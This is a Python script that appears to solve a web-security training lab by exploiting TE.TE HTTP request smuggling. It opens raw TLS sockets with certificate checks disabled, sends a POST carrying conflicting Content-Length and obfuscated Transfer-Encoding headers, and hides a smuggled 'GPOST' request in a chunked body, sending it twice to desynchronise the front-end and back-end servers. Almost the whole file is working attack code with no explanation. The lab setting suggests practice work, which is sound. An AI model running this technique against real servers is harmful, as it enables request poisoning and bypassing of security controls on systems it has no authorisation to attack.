import ssl
import socket
import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    @staticmethod
    def send_crafted_request(method, hostname, port, path, cookies, custom_headers, data, proxy=False):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection(('127.0.0.1', 9999)) if proxy else socket.create_connection((hostname, port)) as sock:
            if proxy:
                connect_request = f'CONNECT {hostname}:{port} HTTP/1.1\r\n\r\n'
                sock.sendall(connect_request.encode('utf-8'))

                response = sock.recv(4096)

            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                if path:
                    request_line = f'{method} https://{hostname}/{path} HTTP/1.1\r\n'
                else:
                    request_line = f'{method} https://{hostname}/ HTTP/1.1\r\n'

                headers = ''
                headers += f'Host: {hostname}\r\n'
                headers += f'Transfer-Encoding: chunked\r\n'
                if custom_headers:
                    for key, value in custom_headers.items():
                        headers += f'{key}: {value}\r\n'

                if cookies:
                    cookie_str = '; '.join([f'{key}={value}' for key, value in cookies.items()])
                    headers += f'Cookie: {cookie_str}\r\n'

                body = ''
                if method == 'POST' and data:
                    body = data

                headers += '\r\n'

                request = request_line + headers + body

                print(request)

                ssock.sendall(request.encode('utf-8'))

                response = b''
                while True:
                    data = ssock.recv(4096)
                    if not data:
                        break
                    response += data

                status_code = response.split(b'\r\n')[0].split(b' ')[1]
                res = response.split(b'\r\n\r\n', 1)[1]
                return status_code.decode('utf-8'), res.decode('utf-8')

    def te_te_smuggling(self):
        body = '5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'
        headers = {
            'Content-Length': '4',
            'Transfer-Encoding': 'foobar'
        }
        status_code, response = self.send_crafted_request('POST', self.lab_url.replace('https://', '').rstrip('/'), 443, None, None, headers, body)
        print(status_code, response)
        status_code, response = self.send_crafted_request('POST', self.lab_url.replace('https://', '').rstrip('/'), 443, None, None, headers, body)
        print(status_code, response)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.te_te_smuggling()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
